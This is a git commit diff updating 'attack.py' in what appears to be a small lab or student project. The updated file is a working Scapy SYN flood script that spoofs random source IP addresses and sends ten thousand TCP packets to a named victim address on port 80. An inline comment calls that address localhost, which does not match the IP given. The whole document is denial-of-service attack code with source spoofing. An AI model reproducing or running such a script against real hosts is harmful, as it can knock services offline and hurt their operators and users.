52e0733fb457f908041bed1abbcd508d4d0d4599
Shani Vahav <92265738+ShaniVahav@users.noreply.github.com>
2022-12-15 13:32:12 +0200

    Update attack.py

--- synFlood_py/attack.py
+++ synFlood_py/attack.py
@@ -1,14 +1,31 @@
-# inspire from: https://www.youtube.com/watch?v=VgwASWaksJE
+# inspire from: https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py
 
-from scapy.all import *
+import random
+from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import send
 
-def synFlood(_src, _tgt):
-    for port in range(1024, 65535):  # 64511 by all
-        _ip = IP(src = _src, dst = _tgt)
-        _tcp = TCP(sport = port, dport = 1337)
-        pkt = IP/TCP
+
+def randomIP():
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+def randomPort():
+    return random.randint(1000, 9000)
+
+
+def synFlood(victim_ip, victim_port):
+    for packet in range(10000):
+        IP_Packet = IP()
+        IP_Packet.src = randomIP()
+        IP_Packet.dst = victim_ip
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = randomPort()
+        TCP_Packet.dport = victim_port
+
+        pkt = IP_Packet / TCP_Packet
         send(pkt)
 
-src = '127.0.0.1'
-tgt = ''
-synFlood(src, tgt)
+
+victim_ip = '10.0.9.1'  # the victim is localhost
+victim_port = 80  # apache server is port 80
+synFlood(victim_ip, victim_port)
